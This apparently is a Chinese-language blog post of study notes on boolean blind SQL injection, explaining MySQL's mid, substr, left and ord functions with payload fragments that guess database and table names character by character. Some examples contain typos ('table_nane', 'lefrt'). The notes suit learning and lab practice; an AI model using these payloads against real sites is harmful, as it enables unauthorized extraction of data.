---
title:  "sql盲注学习"
published: 2025-12-03 
description: "sql盲注的学习过程"
image: ""
tags: ["sql注入","web安全","靶场"]
category: 网安
draft: false
---
# 本篇文章是关于sql盲注的学习过程，主要内容如下：
-[布尔盲注](#布尔盲注)
    - [mid()函数](#mid函数)
    - [substr()函数](#substr函数)
    - [left()函数](#left函数)
    - [ord()函数](#ord函数)
-[报错盲注](#报错盲注)
    
-[时间盲注](#时间盲注)
---
# 布尔盲注
## mid函数
|mid()函数|此函数作用为截取字符串。mid(column_name,start,length)|
|--- | ---   |
|`参数`|描述|
|`column_name`|必需，要截取的字段名|
|`start`|必需，开始位置（起始值为1）。|
|`length`|可选，要截取的长度。如果省略，则截取从start位置到字符串末尾的字符。|
eg: str"123456" mid(str,2,1) 结果为：2
`sql用例：`
```sql
(1)mid(database(),1,1)>'a' 去判断数据库第一位。
(2)mid((select table_nane from information_schema.tables where table_schema=0xxxxx limit 0,1),1,1)>'a' 去判断数据库第一个表的第一位。
```

## substr函数
|substr()函数|也是截取字符串。substr(string,start,length)|
|--- | ---   |
|`参数`|描述|
|`string`|必需，要截取的字符串|
|`start`|必需，开始位置（起始值为1）。|
|`length`|可选，要截取的长度。如果省略，则截取从start位置到字符串末尾的字符。|
`sql用例：`
```sql
(1)substr(database(),1,1)>'a' 去判断数据库名第一位。
(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。
```

## left函数
|left()函数|此函数作用为从字符串左边截取指定长度的字符。left(column_name,length)|
|--- | ---   |
|`参数`|描述|
|`column_name`|必需，要截取的字段名|
|`length`|必需，要截取的长度。如果省略，则截取从start位置到字符串末尾的字符。|
`sql用例：`
```sql
(1)left(database(),1)>'a' 去判断数据库名第一位。
lefrt(database(),2)>'ab' 去判断数据库名前两位。
(2)left((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1)>’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。
```

## ord函数
|ord()函数|此函数作用为返回字符的ASCII码。ord(column_name)|
|--- | ---   |
|`参数`|描述|
|`column_name`|必需，要获取ASCII码的字符。|
`sql用例：`
```sql
(1)ord(mid(database(),1,1))=65 去判断数据库名第一位的ASCII码是否为65。
(2)ord(left(database(),1))=65 去判断数据库名第一位的ASCII码是否为65。
(3)ord(substr(database(),1,1))=65 去判断数据库名第一位的ASCII码是否为65。
在这个里面我们可以去用ASCII码去一一对应字母，然后去判断。
```
---